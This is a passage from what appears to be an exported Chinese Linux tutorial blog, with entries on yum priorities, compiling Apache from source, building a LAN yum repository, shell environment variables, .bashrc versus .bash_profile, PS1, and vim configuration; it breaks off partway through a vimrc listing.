    <content type="text"><![CDATA[yum更新源优先级设置1.安装 yum-priorities1yum install yum-priorities 2.priorities的配置文件是/etc/yum/pluginconf.d/priorities.conf，确认其是否存在。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其内容为: 12[main]enabled=1 # 0禁用 1启用 3.编辑 /etc/yum.repos.d/目录下的*.repo 文件来设置优先级。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数为： 1priority=N # N的值为1-99 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;推荐的设置为： 123[base], [addons], [updates], [extras] … priority=1[centosplus],[contrib] … priority=2Third Party Repos such as rpmforge … priority=N (where N is &gt; 10 and based on your preference) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数字越大,优先级越低]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux源码包安装]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F40.Linux%E6%BA%90%E7%A0%81%E5%8C%85%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Linux源码包安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux下面安装一个源码包是最常用的，在日常的管理工作中，大部分软件都是通过源码安装的。安装一个源码包，是需要自己把源代码编译成二进制的可执行文件。如果读得懂这些源代码，那么就可以去修改这些源代码自定义功能，然后再去编译成想要的。使用源码包的好处除了可以自定义修改源代码外还可以定制相关的功能，因为源码包在编译的时候是可以附加额外的选项的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;源码包的编译用到了linux系统里的编译器，常见的源码包一般都是用C语言开发的，这也是因为C语言为linux上最标准的程序语言。Linux上的C语言编译器叫做gcc，利用它就可以把C语言变成可执行的二进制文件。所以如果你的机器上没有安装gcc就没有办法去编译源码。你可以使用 yum install -y gcc 来完成安装。 安装一个源码包，通常需要三个步骤：./configure&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这一步可以定制功能，加上相应的选项即可，具有有什么选项可以通过 ./configure –help 命令来查看。在这一步会自动检测你的linux系统与相关的套件是否有编译该源码包时需要的库，因为一旦缺少某个库就不能完成编译。只有检测通过后才会生成一个Makefile文件。 make&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用这个命令会根据Makefile文件中预设的参数进行编译，这一步其实就是gcc在工作了。 make install&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装步骤，生成相关的软件存放目录和配置文件的过程。 Apache源码安装实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的3步并不是所有的源码包软件都一样的，也就是说源码包的安装并非具有一定的标准安装步骤。这就需要拿到源码包解压后，然后进入到目录找相关的帮助文档，通常会以INSTALL或者README为文件名。所以一定要去看一下。 1.下载一个源码包下载源码包一定要去官方站点去下载，不要在网上随便下载，那样很不安全。因为下载到的源码包很有可能是被人修改过的。 12[root@localhost src]# cd /usr/local/src/[root@localhost src]# wget http://mirrors.hust.edu.cn/apache/httpd/httpd-2.2.27.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载地址为apache官方网站上提供的一个镜像，下载速度还可以。在下载之前，进入到了 “/usr/local/src” 目录，这是因为习惯把源码包都放到这个目录下，这样做的好处是，方便自己和其他管理员维护，所以以后下载的源码包都统一放到这个目录下吧。 2.解压源码包1[root@localhost src]# tar jxvf httpd-2.2.27.tar.bz2 3.配置相关的选项，并生成Makefile123456789101112131415161718192021[root@localhost src]# cd httpd-2.2.27[root@localhost httpd-2.2.27]# ./configure --help |less`configure' configures this package to adapt to many kinds of systems.Usage: ./configure [OPTION]... [VAR=VALUE]...To assign environment variables (e.g., CC, CFLAGS...), specify them asVAR=VALUE. See below for descriptions of some of the useful variables.Defaults for the options are specified in brackets.Configuration: -h, --help display this help and exit --help=short display options specific to this package --help=recursive display the short help of all the included packages -V, --version display version information and exit -q, --quiet, --silent do not print `checking ...' messages --cache-file=FILE cache test results in FILE [disabled] -C, --config-cache alias for `--cache-file=config.cache' -n, --no-create do not create output files --srcdir=DIR find the sources in DIR [configure dir or `..'] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 ./configure –help 命令查看可以使用的选项。一般常用的有 –prefix=PREFIX 这个选项的意思是定义软件包安装到哪里。一个小小的建议，通常源码包都是安装在/usr/local/目录下的。比如，把apache安装在/usr/local/apache2下，那么这里就应该这样写 –prefix=/usr/local/apache2 其他还有好多选项，如果有耐心可以挨个去看一看都有什么作用。 1234567891011121314151617181920212223242526[root@localhost httpd-2.2.27]# ./configure --prefix=/usr/local/apache2checking for chosen layout... Apachechecking for working mkdir -p... yeschecking build system type... i686-pc-linux-gnuchecking host system type... i686-pc-linux-gnuchecking target system type... i686-pc-linux-gnuConfiguring Apache Portable Runtime library ...checking for APR... reconfigconfiguring package in srclib/apr nowchecking build system type... i686-pc-linux-gnuchecking host system type... i686-pc-linux-gnuchecking target system type... i686-pc-linux-gnuConfiguring APR libraryPlatform: i686-pc-linux-gnuchecking for working mkdir -p... yesAPR Version: 1.4.6checking for chosen layout... aprchecking for gcc... nochecking for cc... nochecking for cl.exe... noconfigure: error: in `/usr/local/src/httpd-2.2.27/srclib/apr':configure: error: no acceptable C compiler found in $PATHSee `config.log' for more detailsconfigure failed for srclib/apr &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不幸的是，一开始就报错了，因为没有gcc编译器，需要先安装一下。 1[root@localhost httpd-2.2.27]# yum install -y gcc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于gcc依赖的包很多，所以安装时间会长一些。安装完后，再继续上面的步骤。 1[root@localhost httpd-2.2.27]# ./configure --prefix=/usr/local/apache2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;验证这一步是否成功的命令是： 12[root@localhost httpd-2.2.27]# echo $?0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;返回值如果是 “0” 则执行成功，否则就是没有成功。此时就成功生成 Makefile 了。 12[root@localhost httpd-2.2.27]# ls -l Makefile-rw-r--r-- 1 root root 8954 5月 13 12:02 Makefile 4.进行编译12[root@localhost httpd-2.2.27]# make-bash: make: command not found &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;又发生错误了，提示 “make” 命令没有发现，解决办法是安装make工具。 1[root@localhost httpd-2.2.27]# yum install -y make &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;继续make 1234567[root@localhost httpd-2.2.27]# makeMaking all in srclibmake[1]: Entering directory `/usr/local/src/httpd-2.2.27/srclib'Making all in aprmake[2]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'make[3]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'/bin/sh /usr/local/src/httpd-2.2.27/srclib/apr/libtool --silent --mode=compile gcc -g -O2 -pthread -DHAVE_CONFIG_H -DLINUX=2 -D_REENTRANT -D_GNU_SOURCE -D_LARGEFILE64_SOURCE -I./include -I/usr/local/src/httpd-2.2.27/srclib/apr/include/arch/unix -I./include/arch/unix -I/usr/local/src/httpd-2.2.27/srclib/apr/include/arch/unix -I/usr/local/src/httpd-2.2.27/srclib/apr/include -o passwd/apr_getpass.lo -c passwd/apr_getpass.c &amp;&amp; touch passwd/apr_getpass.lo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编译的时候，就会出现类似这么多乱七八糟的信息，编译的时间比较长，CPU使用率会很高，这是因为CPU高速计算，编译完后，再使用 echo $? 验证一下是否正常成功。 12[root@localhost httpd-2.2.27]# echo $?0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是0的话，就可以执行最后一步了。 5.安装12345678[root@localhost httpd-2.2.27]# make installMaking install in srclibmake[1]: Entering directory `/usr/local/src/httpd-2.2.27/srclib'Making install in aprmake[2]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'make[3]: Entering directory `/usr/local/src/httpd-2.2.27/srclib/apr'make[3]: Nothing to be done for `local-all'.make[3]: Leaving directory `/usr/local/src/httpd-2.2.27/srclib/apr' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然也可以使用 echo $? 看看有没有正确安装，执行完这一步，则会在 “/usr/local/apache2” 目录下增加了很多目录。 123[root@localhost httpd-2.2.27]# ls /usr/local/apache2/bin cgi-bin error icons lib man modulesbuild conf htdocs include logs manual &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此，apache源码的安装就完成了]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux解压大于4G的压缩包]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F36.%20Linux%E8%A7%A3%E5%8E%8B%E5%A4%A7%E4%BA%8E4G%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85%2F</url>
    <content type="text"><![CDATA[Linux解压大于4G的zip压缩包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux下不支持解压大于4G的zip压缩包。解决办法如下： 12wget -c http://packages.sw.be/p7zip/p7zip-9.13-1.el5.rf.i386.rpmwget -c http://packages.sw.be/p7zip/p7zip-plugins-9.13-1.el5.rf.i386.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载完成后安装： 12rpm -ivh p7zip-9.13-1.el5.rf.i386.rpmrpm -ivh p7zip-plugins-9.13-1.el5.rf.i386.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压命令： 17z x 123.zip]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yum局域网软件源搭建]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F39.yum%E5%B1%80%E5%9F%9F%E7%BD%91%E8%BD%AF%E4%BB%B6%E6%BA%90%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[yum局域网软件源搭建1.搭建apache服务器或ftp服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum安装或二进制安装 2、准备RPM包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把CentOS的DVD1和DVD2.iso都下载下来，把DVD1.iso里的所有内容解压出来，放到/var/www/html/centos-6目录下，然后把DVD2.iso解压出来的Packages目录下的rpm包复制到/var/html/centos-6/Packages目录下，这样/var/html/centos-6/Packages里面就有了6000多个rpm包。 3、创建yum仓库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;准备createrepo： 1yum -y install createrepo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建repository： 1createrepo /var/www/html/centos-6/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建完成之后，会在/var/www/html/centos-6/repodata下生成一些文件。 4、使用软件源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在其他centos机器上试试软件源能不能用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先修改机器上软件源配置文件： 12345678910111213141516171819# cd /etc/yum.repos.d/# mkdir bk# mv *.repo bk/# cp bk/CentOS-Base.repo ./# vi CentOS-Base.repoCentOS-Base.repo文件修改之后如下：[base]name=CentOS-$releasever - Basebaseurl=http://*.*.*.*/centos-6/gpgcheck=1(改成0下面那行就不用设置了)gpgkey=http:///*.*.*.*/centos-6/RPM-GPG-KEY-CentOS-6enabled=1#released updates#[updates]#name=CentOS-$releasever - Updates#baseurl=http:///*.*.*.*/centos-6/#gpgcheck=1#gpgkey=http:///*.*.*.*/centos-6/RPM-GPG-KEY-CentOS-6#enabled = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存之后，就可以使用局域网的软件源了： 1# yum update]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 环境变量]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F4.%20Linux%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[Linux 环境变量显示环境变量1echo $[变量名] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 12echo $HOME/root 设置一个新的环境变量123$ export HELLO="Hello!"$ echo $HELLOHello! 查看全局环境变量命令：env&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 env 命令显示所有的环境变量 123456$ envHOSTNAME=redbooks.safe.orgPVM_RSH=/usr/bin/rshShell=/bin/bashTERM=xtermHISTSIZE=1000 查看所有环境变量命令：set&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 set 命令显示所有本地定义的 shell 变量 12345678$ setBASH=/bin/bashBASH_VERSINFO=([0]="2"[1]="05b"[2]="0"[3]="1"[4]="release"[5]="i386-redhat-linux-gnu")BASH_VERSION='2.05b.0(1)-release'COLORS=/etc/DIR_COLORS.xtermCOLUMNS=80DIRSTACK=()DISPLAY=:0.0 删除一个变量：unset&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1unset [变量名] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只针对当前会话 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;set可以设置某个环境变量的值。清除环境变量的值用unset命令。如果未指定值，则该变量值将被设为NULL。示例如下： 12345$ export TEST="Test..." #增加一个环境变量TEST$ env|grep TEST #此命令有输入，证明环境变量TEST已经存在了TEST=Test...$ unset $TEST #删除环境变量TEST$ env|grep TEST #此命令没有输出，证明环境变量TEST已经存在了 使用 readonly 命令设置只读变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用了 readonly 命令，变量就不可以被修改或清除了&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例如下： 123456$ export TEST="Test..." #增加一个环境变量TEST$ readonly TEST #将环境变量TEST设为只读$ unset TEST #会发现此变量不能被删除-bash: unset: TEST: cannot unset: readonly variable$ TEST="New" #会发现此也变量不能被修改-bash: TEST: readonly variable &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境变量的设置位于 /etc/profile 文件，如果需要增加新的环境变量可以添加下属行 1export PATH=$PATH:/PATH1:/PATH2:/PATHN Linux 的变量种类&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按变量的生存周期来划分，Linux 变量可范围两类：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、永久的：需要修改配置文件，变量永久生效。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、临时的：使用 export 命令声明即可，变量在关闭 shell 时失效。 环境变量的配置文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;全局： /etc/profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;局部： ~/.bash_profile 设置变量的方法1.在 /etc/profile 文件中添加变量｛对所有用户生效（永久的）｝&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 vim 在文件 /etc/profile 文件中增加变量，该变量将会对 Linux下 所有用户有效，并且是“永久的”。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：编辑 /etc/profile 文件，添加CLASSPATH变量 12# vim /etc/profileexport CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：修改文件后要想马上生效还要运行 1# source /etc/profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不然只能在下次重进此用户时生效 2.在用户目录下个 .bash_profile 文件中增加变量｛对单一用户生效（永久的）｝&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 vim在用户目录下的 .bash_profile 文件中增加变量，改变量仅会对当前用户有效，并且是“永久的”。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：编辑guok用户目录(/home/guok)下的.bash_profile 1$ vim /home/guok/.bash.profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容 1export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：修改文件后要想马上生效还要运行 1$ source /home/guok/.bash_profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不然只能在下次重进此用户时生效 3.直接运行 export 命令定义变量｛只对当前 shell （BASH）有效（临时的）｝12export JAVA_HOME=/usr/local/java #添加新变量名export PATH=$PATH:/usr/local/php/bin #修改已有变量名 常用的环境变量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PATH：决定了shell将到哪些目录中寻找命令或程序，PATH的值是一系列以冒号分割的目录注意：最好不要把 “./“ 放到 PATH 中，这样会引起安全问题 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HOME：当前用户主目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HISTSIZE：历史记录数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LOGNAME：当前用户的登录名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HOSTNAME：指主机的名称 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SHELL：当前用户Shell类型 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;LANGUGE：语言相关的环境变量，多语言可以修改此环境变量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MAIL&#160;&#160;&#160;&#160;当前用户的邮件存放目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS1：[\u@\h \W]\$ &#160;&#160;&#160;&#160;基本提示符，对于root用户是#，对于普通用户是$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS2:敲错以后进入的符号 PATH 声明，其格式为1PATH=$PATH:&lt;PATH 1&gt;:&lt;PATH 2&gt;:&lt;PATH 3&gt;:------:&lt;PATH N&gt;]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash_profile和bashrc区别]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F43.bash_profile%E5%92%8Cbashrc%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[bash_profile和bashrc区别.bash_profile 与 .bashrc 的区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_profile is executed for login shells, while .bashrc is executed for interactive non-login shells. login shell 与 non-login shell 的区别 当你直接在机器login界面登陆、使用ssh登陆或者su切换用户登陆时，.bash_profile 会被调用来初始化shell环境 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Note：.bash_profile文件默认调用.bashrc文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.bash_profile中有如下内容 123if [ -f ~/.bashrc ]; then . ~/.bashrcfi 当你不登陆系统而使用ssh直接在远端执行命令，.bashrc 会被调用 当你已经登陆系统后，每打开一个新的Terminal时，.bashrc 都会被再次调用。 测试准备工作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hclient2主机hadoop用户家目录下执行 12[hadoop@hclient2 ~]$ echo "invoke hclient2:~/.bashrc"&gt;&gt;.bashrc[hadoop@hclient2 ~]$ echo "invoke hclient2:~/.bash_profile"&gt;&gt;.bash_profile Login Shell 窗口登陆 1234567891011Red Hat Enterprise Linux Server release 6.3 (Santiago)Kernel 2.6.32-279.el6.x86_64 on an x86_64hclient2 login: hadoopPassword:Last login: Mon Feb 25 23:03:45 on tty1invoke hclient2:~/.bashrcinvoke hclient2:~/.bash_profile[hadoop@hclient2 ~]$ SSH 登陆 12345[hadoop@hserver ~]$ ssh hclient2Last login: Mon Feb 25 22:42:19 2013 from hserverinvoke hclient2:~/.bashrcinvoke hclient2:~/.bash_profile[hadoop@hclient2 ~]$ su 登陆 123[root@hclient2 ~]# su - hadoopinvoke hclient2:~/.bashrcinvoke hclient2:~/.bash_profile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Non-login Shell: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Note: 1ssh ...[user@] hostname [command] 1234If command is specified, it is executed on the remote host instead of a login shell.[hadoop@hserver ~]$ ssh hclient2 hostnameinvoke hclient2:~/.bashrchclient2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：若要配置环境变量之类，最保险是写在 .bashrc 文件中。因为不管是登陆还是不登陆，该文件总会被调用！]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux环境变量之“PS1”]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F41.Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B9%8B%E2%80%9CPS1%E2%80%9D%2F</url>
    <content type="text"><![CDATA[Linux环境变量之“PS1”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS1（是数字1而不是字母l），每个版本bash的PS1变量内的特殊符号可能有些小的差异，你可以先man bash 一下。下面是FC4环境下默认的特殊符号所代表的意义： \d ：代表日期，格式为weekday month date，例如：”Mon Aug 1” \H ：完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux \h ：仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \t ：显示时间为24小时格式，如：HH：MM：SS \T ：显示时间为12小时格式 \A ：显示时间为24小时格式：HH：MM \u ：当前用户的账号名称 \v ：BASH的版本信息 \w ：完整的工作目录名称。家目录会以 ~代替 \W ：利用basename取得工作目录名称，所以只会列出最后一个目录 \# ：下达的第几个命令 \$ ：提示字符，如果是root时，提示符为：# ，普通用户则为：$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的PS1内容为： ‘[\u@\h \W]\$ ‘ ，所以默认的提示符就是： 1[root@localhost ~]# 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但设置PS1的时候需要稍微处理一下 1PS1="[\\u@\\h \\W]\\$ " 这样显示的结果才是正确的]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim快速删除制定的一段字符]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F34.%20vim%E5%BF%AB%E9%80%9F%E5%88%A0%E9%99%A4%E5%88%B6%E5%AE%9A%E7%9A%84%E4%B8%80%E6%AE%B5%E5%AD%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[vim快速删除制定的一段字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为不是一行，所以用dd不行，但用x去删除的话，又太慢。今天发现一种特别快速删除的方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那就是使用da，如何使用，请看下面的例子。比如，我的1.txt内容如下： 12311111111111111111111111111222222222222222222222222222222B3NzaC1yc2EAAAABIwAAAQEAv5oJvuIdaaVUsDOA2FbfnL0K2GbTc05Yg6TGM+8SNleI6bU5MhAy2uP5J4yCrMu43911hEJ2uh1UPycWX1O4xpEgUm8TGIs1HoQySnukv3g121uOLACRj37qqL9j4RRhrUxhunAW3alLSGIV0mxFD0ApyycFoLA/1I3hU7Yyx7tdripwz0FeHHhT3Qjfe9yC8Z6Ptq7cvBPXBBvc/G8pXVq3bnGMtj9Ifmbh7NnTvfHnEZGacf2MR4FSy0MMuNL0k3X5sBlsyP9/rXY9CPOh73eKUhZQoK3uWjwuDRp/dqrxgWDVeg0NZ+0t130pKu/LSREothWoVBu54rrtUUIdb3Sq0xsW4x9EhKGJJHPvBrbGbiDPTKBUaHdQEfmQQPAWeeX1hMC7lCunnfgTzf39Pv/2VpXz2l8NH2Jem0nrS48A6sf4eFz5VIakoRySMQu/6mY4s9aU3arbX+JvUE9s2/7D+JdqJlINtQqRU4V92LQq3BJaSMmKiwnPSytxDtARI3+8I2XXqFCJ5bBY7e333333333333333333333344444444444444444444444444444 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我现在想删除22222222222和33333333333333333之间的字符只需要这样做： 把1.txt的内容改成： 12311111111111111111111111111222222222222222222222222222222&#123;B3NzaC1yc2EAAAABIwAAAQEAv5oJvuIdaaVUsDOA2FbfnL0K2GbTc05Yg6TGM+8SNleI6bU5MhAy2uP5J4yCrMu43911hEJ2uh1UPycWX1O4xpEgUm8TGIs1HoQySnukv3g121uOLACRj37qqL9j4RRhrUxhunAW3alLSGIV0mxFD0ApyycFoLA/1I3hU7Yyx7tdripwz0FeHHhT3Qjfe9yC8Z6Ptq7cvBPXBBvc/G8pXVq3bnGMtj9Ifmbh7NnTvfHnEZGacf2MR4FSy0MMuNL0k3X5sBlsyP9/rXY9CPOh73eKUhZQoK3uWjwuDRp/dqrxgWDVeg0NZ+0t130pKu/LSREothWoVBu54rrtUUIdb3Sq0xsW4x9EhKGJJHPvBrbGbiDPTKBUaHdQEfmQQPAWeeX1hMC7lCunnfgTzf39Pv/2VpXz2l8NH2Jem0nrS48A6sf4eFz5VIakoRySMQu/6mY4s9aU3arbX+JvUE9s2/7D+JdqJlINtQqRU4V92LQq3BJaSMmKiwnPSytxDtARI3+8I2XXqFCJ5bBY7e&#125;333333333333333333333344444444444444444444444444444 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，2222 和{ 之间没有换行。 把光标移动到第一个{，也就是最后一个2后，然后输入da{ 即可把{}内的字符全部删除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，除了可以使用{ 外，还可以使用 “, ‘, ( 等成对的特殊符号。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实vim还有一个比较常用的那就是v了，用v和d来删除也挺方便的： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开一个文本后，直接按v，然后移动光标可以选中文本，当选中完你想要的文本后，直接按d，就删除了]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim设置自动缩进]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F32.%20vim%E8%AE%BE%E7%BD%AE%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%8A%A8%E7%BC%A9%E8%BF%9B%2F</url>
    <content type="text"><![CDATA[vim设置自动缩进&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;centos系统，修改vim的配置文件 /etc/vimrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容：1) 打开 vimrc ，添加以下语句来使得语法高亮显示：syntax on2) 如果此时语法还是没有高亮显示，那么在 /etc 目录下的 profile 文件中添加以下语句：export TERM=xterm-color3) 解决方向键和退格键失效的问题（采用非兼容模式）set nocompatibleset backspace=24) 设置 Windows 风格的 C/C++ 自动缩进（添加以下 set 语句到 vimrc 中） 设置（软）制表符宽度为 4 ：set tabstop=4set softtabstop=4 设置缩进的空格数为 4set shiftwidth=4 设置自动缩进 ：即每行的缩进值与上一行相等；使用 noautoindent 取消设置：set autoindent 设置 使用 C/C++ 语言的自动缩进方式：set cindent 设置 C/C++ 语言的具体缩进方式 ：set cinoptions={0,1s,t0,n-2,p2s,(03s,=.5s,&gt;1s,=1s,:1s 如果想在左侧显示文本的行号，可以用以下语句：set nu 最后，如果没有下列语句，就加上吧: 12345if &amp;term=="xterm"set t_Co=8 set t_Sb=^[[4%dmset t_Sf=^[[3%dmendif]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim的设置详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F31.%20vim%E7%9A%84%E8%AE%BE%E7%BD%AE%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[vim的设置详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vim通过一个叫vimrc的文件来进行设置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;vimrc 配置文件存放位置： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统vimrc在 /etc/vimrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户的在 $HOME/.vimrc 这个默认不存在，需用户自定义创建。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面介绍vimrc中常用的配置选项，其中以”为开头的行为不生效的行，也就是说在vimrc配置文件中，它是以”为注释符号的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186set nobackup" 不要生成swap文件，当buffer被丢弃的时候隐藏它setlocal noswapfileset bufhidden=hide" 字符间插入的像素行数目set linespace=0" 增强模式中的命令行自动完成操作set wildmenu" 在状态行上显示光标所在位置的行号和列号set rulerset rulerformat=%20(%2*%&lt;%f%=\ %m%r\ %3l\ %c\ %p%%%)" 命令行（在状态行下）的高度，默认为1，这里是2set cmdheight=2" 使回格键（backspace）正常处理indent, eol, start等set backspace=2" 允许backspace和光标键跨越行边界set whichwrap+=&lt;,&gt;,h,l" 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）set mouse=aset selection=exclusiveset selectmode=mouse,key" 启动的时候不显示那个援助索马里儿童的提示set shortmess=atI" 通过使用: commands命令，告诉我们文件的哪一行被改变过set report=0" 不让vim发出讨厌的滴滴声set noerrorbells" 在被分割的窗口间显示空白，便于阅读set fillchars=vert:\ ,stl:\ ,stlnc:\"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 搜索和匹配"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" 高亮显示匹配的括号set showmatch" 匹配括号高亮的时间（单位是十分之一秒）set matchtime=5" 在搜索的时候忽略大小写set ignorecase" 不要高亮被搜索的句子（phrases）set nohlsearch" 